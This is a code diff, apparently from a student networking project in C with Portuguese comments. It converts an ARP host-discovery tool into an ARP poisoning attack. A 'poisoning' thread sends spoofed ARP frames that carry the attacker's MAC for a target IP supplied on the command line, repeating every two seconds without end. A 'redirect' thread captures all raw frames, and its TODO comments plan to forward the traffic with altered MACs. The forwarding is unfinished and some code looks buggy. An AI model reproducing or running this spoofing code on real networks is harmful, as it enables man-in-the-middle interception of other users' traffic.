@@ -15,7 +15,7 @@
 #define BUFFER_SIZE 1600
 #define MAX_DATA_SIZE 1500
 #define ARP_HDRLEN 28
-#define IF_DEBUG 1
+#define IF_DEBUG 0
 
 #define INT_TO_ADDR(_addr) \
 (_addr & 0xFF), \
@@ -36,8 +36,8 @@ struct _arp_hdr {
   uint8_t target_ip[4];
 };
 
-pthread_mutex_t mutex;
 char ifname[IFNAMSIZ];
+char target_ip[15];
 
 
 int potencia(int base, int expoente){
@@ -182,32 +182,26 @@ int setArpTable(char *ip, char *mac){
 	return 0;
 }
 
-void * discover(void *args)
+void * redirect(void *args)
 {
 	//clear arp table
-	FILE *pFile;
-	pFile = fopen("arp_table.txt", "w");
-	fclose(pFile);
+	//FILE *pFile;
+	//pFile = fopen("arp_table.txt", "w");
+	//fclose(pFile);
 	char buffer[BUFFER_SIZE];
-	short int ethertype = htons(0x0806);
-	char sender_ip[15];
 
-	printf("Listening to reply packets...\n");
-    //pthread_mutex_unlock(&mutex);
+	printf("Listening packets...\n");
 	while (1) {
 		unsigned char mac_dst[6];
 		unsigned char mac_src[6];
 		//unsigned char *arp;
 		short int e_type;
-		unsigned char ip_sd[4];
-        short op_code;
 		char sender_mac[17];
         int fd;
         if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
 	        perror("socket");
 	        exit(1);
-        }
-		
+        }		
 
 		/* Recebe pacotes */
 		if (recv(fd,(char *) &buffer, BUFFER_SIZE, 0) < 0) {
@@ -221,39 +215,27 @@ void * discover(void *args)
 		memcpy(mac_src, buffer+sizeof(mac_dst), sizeof(mac_src));
 		memcpy(&e_type, buffer+sizeof(mac_dst)+sizeof(mac_src), sizeof(e_type));
 		e_type = ntohs(e_type);
-		
-		memcpy(ip_sd, buffer+sizeof(mac_dst)+sizeof(mac_src)+(16*sizeof(char)), sizeof(ip_sd));
-        memcpy(&op_code, buffer+sizeof(mac_dst)+sizeof(mac_src)+(8*sizeof(char)), sizeof(op_code));
 
-		op_code = ntohs(op_code);
+		printf("\n--- Received:\n");
+		printf("MAC destino: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+					mac_dst[0], mac_dst[1], mac_dst[2], mac_dst[3], mac_dst[4], mac_dst[5]);
 
-		if (htons(e_type) == ethertype && op_code == 2) {
-            printf("opconde:%d\n", op_code);
-			printf("\n--- Received:\n");
-			printf("MAC destino: %02x:%02x:%02x:%02x:%02x:%02x\n", 
-                        mac_dst[0], mac_dst[1], mac_dst[2], mac_dst[3], mac_dst[4], mac_dst[5]);
+		memset(sender_mac, 0, sizeof(sender_mac));
+		sprintf(sender_mac, " %02x:%02x:%02x:%02x:%02x:%02x", mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
+		printf("MAC origem:  %s\n", sender_mac);
 
-			memset(sender_mac, 0, sizeof(sender_mac));
-			sprintf(sender_mac, " %02x:%02x:%02x:%02x:%02x:%02x", mac_src[0], mac_src[1], mac_src[2], mac_src[3], mac_src[4], mac_src[5]);
-			printf("MAC origem:  %s\n", sender_mac);
+		printf("EtherType: 0x%04x\n", e_type);
 
-			printf("EtherType: 0x%04x\n", e_type);
-			
-			memset(sender_ip, 0, sizeof(sender_ip));
-			sprintf(sender_ip, "%d.%d.%d.%d", ip_sd[0], ip_sd[1], ip_sd[2], ip_sd[3]);
-			printf("IP sender: %s\n", sender_ip);
+		// TODO: Verify if have to redirect the buffer
+		// TODO: Redirect the buffer changing mac		
 
-			printf("---\n");
-
-			setArpTable(sender_ip, sender_mac);			
-
-		}
+		printf("---\n");
 	}
 
     pthread_exit(NULL);
 }
 
-void * sender(void *args){
+void * poisoning(void *args){
 	int fd;
 	struct ifreq if_idx;
 	struct ifreq if_mac;
@@ -332,46 +314,29 @@ void * sender(void *args){
 	arphdr.opcode = htons (1);
 
 	/* Sender hardware address (48 bits): MAC address */
-	memcpy (&arphdr.sender_mac, if_mac.ifr_name, 6 * sizeof (uint8_t));
+	
+	// if(if_mac.ifr_hwaddr.sa_data[3] > 0xffffff00){
+	// 	printf("tretta mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00);
+	// 	if_mac.ifr_hwaddr.sa_data[3] = if_mac.ifr_hwaddr.sa_data[3] % 0xffffff00;
+	// }
+	// printf("now mac: %.02x\n", if_mac.ifr_hwaddr.sa_data[3]);
 
+	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
 	/* Target hardware address (48 bits): zero, since we don't know it yet. */
 	memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
 	
 	// help vars for multiple sends
-	int i = 0;
-	int range_host = 0;
-	int s_ip = 0;
 	char sender_ip[15];
-	char target_ip[15];
-
-	unsigned char target_byte[4];
-
-	// get sender ip
-	s_ip = getip(ifname, sender_ip);
-
-	//get renge hosts
-	range_host = getrangeip(ifname);
 
 	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
 
-	//ip destinatário fateado
-    target_byte[0] = s_ip & 0xFF;
-    target_byte[1] = (s_ip >> 8) & 0xFF;
-    target_byte[2] = (s_ip >> 16) & 0xFF;
-	
-	for(i=1; i < range_host; i++){
+	inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
+	inet_pton (AF_INET, target_ip, &arphdr.target_ip);
 
-    	target_byte[3] = i;
+	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
+	frame_len += ARP_HDRLEN;
 
-		// set host number
-		memset(target_ip, 0, sizeof(target_ip));
-		sprintf(target_ip, "%d.%d.%d.%d", target_byte[0],target_byte[1],target_byte[2],target_byte[3]);
-
-		inet_pton (AF_INET, target_ip, &arphdr.target_ip);
-
-		memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
-		frame_len += ARP_HDRLEN;
-
+	while(1){
 		// Envia pacote 
 		if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
 			perror("send");
@@ -380,9 +345,10 @@ void * sender(void *args){
 		}
 
 		if(IF_DEBUG){
-			printf("Broadcast\tARP\tWho has %s? Tell %s\n", target_ip, sender_ip);
+			printf("Poisoning\tARP\t%s? at %s\n", target_ip, arphdr.sender_mac);
 		}
-		frame_len -= ARP_HDRLEN;
+
+		sleep(2);
 	}
 	
 	close(fd);
@@ -391,27 +357,25 @@ void * sender(void *args){
 
 int main(int argc, char *argv[])
 {
-    if (argc != 2) {
-		printf("Usage: %s iface\n", argv[0]);
+    if (argc != 3) {
+		printf("Usage: %s iface target_ip\n", argv[0]);
 		return 1;
 	}
 	strcpy(ifname, argv[1]);
+	strcpy(target_ip, argv[2]);
 
-    pthread_t thread_dicover;
-    pthread_t thread_sender;
+    pthread_t thread_redirect;
+    pthread_t thread_poisoning;
 
-    pthread_mutex_init(&mutex, NULL);
-    //pthread_mutex_lock(&mutex);
-
-    if (pthread_create(&thread_dicover, NULL, discover, NULL) != 0) {
+    if (pthread_create(&thread_redirect, NULL, redirect, NULL) != 0) {
 	    printf("Erro ao criar a thread.\n");
 	    exit(-1);
     }
 
-    if (pthread_create(&thread_sender, NULL, sender, NULL) != 0) {
-	    printf("Erro ao criar a thread.\n");
-	    exit(-1);
-    }
+	if (pthread_create(&thread_poisoning, NULL, poisoning, NULL) != 0) {
+		printf("Erro ao criar a thread.\n");
+		exit(-1);
+	}
     pthread_exit(NULL);
 }
 
